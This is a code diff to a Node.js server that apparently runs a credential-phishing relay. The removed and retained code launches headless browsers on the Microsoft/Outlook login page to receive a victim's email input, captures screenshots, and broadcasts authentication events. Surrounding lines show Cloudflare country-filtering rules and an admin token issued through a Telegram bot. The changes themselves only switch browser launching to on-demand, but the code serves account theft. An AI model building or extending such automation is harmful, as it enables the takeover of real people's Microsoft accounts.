@@ -270,23 +270,8 @@ async function getWarmBrowser() {
     return null;
 }
 
-// Start warm browser pool immediately when server starts
-async function initializeWarmBrowserPool() {
-    console.log('🔥 Initializing warm browser pool...');
-    try {
-        await maintainWarmBrowserPool();
-        console.log('✅ Warm browser pool initialized');
-    } catch (error) {
-        console.error('❌ Failed to initialize warm browser pool:', error.message);
-    }
-}
-
-// Warm browser pool initialization disabled - using only private browsers
-// setTimeout(() => {
-//     initializeWarmBrowserPool().catch(error => {
-//         console.error('Warm browser pool initialization failed:', error.message);
-//     });
-// }, 2000); // Start after 2 seconds to let server finish starting
+// Warm browser pool disabled - using only on-demand private browsers
+// No proactive browser initialization
 
 // Cleanup expired sessions
 setInterval(async () => {
@@ -2838,57 +2823,7 @@ app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, asyn
     }
 });
 
-// Email Page Load - Auto Prepare Browser endpoint  
-app.post('/api/prepare-email-page', async (req, res) => {
-    try {
-        console.log('📧 Email page loaded - preparing browser automatically');
-        
-        const sessionId = createSessionId();
-        
-        // Create and prepare a private browser for email input
-        const automation = new ClosedBridgeAutomation({
-            enableScreenshots: true,
-            screenshotQuality: 80,
-            sessionId: sessionId,
-            eventCallback: broadcastAuthEvent
-        });
-
-        // Initialize and navigate browser
-        await automation.init();
-        console.log(`🔧 Browser initialized for email page: ${sessionId}`);
-
-        const navigated = await automation.navigateToOutlook();
-        if (!navigated) {
-            throw new Error('Failed to navigate to Microsoft login page');
-        }
-        console.log(`🌐 Browser ready for email input: ${sessionId}`);
-
-        // Store the prepared browser session
-        automationSessions.set(sessionId, {
-            automation: automation,
-            status: 'email_page_ready',
-            email: null,
-            startTime: Date.now()
-        });
-
-        res.json({
-            success: true,
-            sessionId: sessionId,
-            message: 'Browser prepared and ready for email input',
-            status: 'ready'
-        });
-
-    } catch (error) {
-        console.error('❌ Failed to prepare browser for email page:', error.message);
-        res.status(500).json({
-            success: false,
-            error: 'Failed to prepare browser',
-            details: error.message
-        });
-    }
-});
-
-// Instant Browser Preparation API endpoint
+// Instant Browser Preparation API endpoint (on-demand only)
 app.post('/api/prepare-browser', async (req, res) => {
     try {
         console.log('🚀 Instant browser preparation requested');
@@ -2997,64 +2932,7 @@ app.listen(config.server.port, '0.0.0.0', () => {
     } else {
         console.log('🔑 Admin token available via Telegram bot - Use /start to access');
     }
-
-    // Proactively prepare browser for immediate availability (non-blocking)
-    setTimeout(() => {
-        // Use non-blocking async wrapper to prevent server crashes
-        (async () => {
-            let automation = null;
-            try {
-                console.log('🚀 Proactively preparing browser for immediate email input...');
-                
-                const sessionId = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
-                automation = new ClosedBridgeAutomation();
-
-                // Initialize private browser with timeout
-                const initPromise = automation.init();
-                const initResult = await Promise.race([
-                    initPromise,
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Browser init timeout')), 15000))
-                ]);
-
-                console.log('Browser initialized successfully');
-
-                // Navigate directly to Microsoft login page with timeout
-                const navPromise = automation.navigateToOutlook();
-                const navigated = await Promise.race([
-                    navPromise,
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Navigation timeout')), 10000))
-                ]);
-
-                if (!navigated) {
-                    throw new Error('Failed to navigate to Microsoft login page');
-                }
-
-                console.log(`✅ Proactive browser ready for immediate email input: ${sessionId}`);
-
-                // Store the prepared browser session 
-                automationSessions.set(sessionId, {
-                    automation: automation,
-                    status: 'email_page_ready',
-                    email: null,
-                    startTime: Date.now()
-                });
-
-            } catch (error) {
-                console.warn('⚠️ Proactive browser preparation failed (server continues normally):', error.message);
-                
-                // Critical: Clean up automation instance to prevent resource leaks
-                if (automation) {
-                    try {
-                        console.log('🧹 Cleaning up failed browser instance...');
-                        await automation.close();
-                        console.log('✅ Browser cleanup completed');
-                    } catch (cleanupError) {
-                        console.warn('⚠️ Browser cleanup failed:', cleanupError.message);
-                    }
-                }
-            }
-        })().catch(error => {
-            console.warn('⚠️ Proactive browser preparation wrapper failed (server continues):', error.message);
-        });
-    }, 1500); // Start 1.5 seconds after server starts
+    
+    // Browser preparation disabled - browsers launch only when user enters email
+    console.log('⚡ Fast mode: Browsers launch on-demand only');
 });
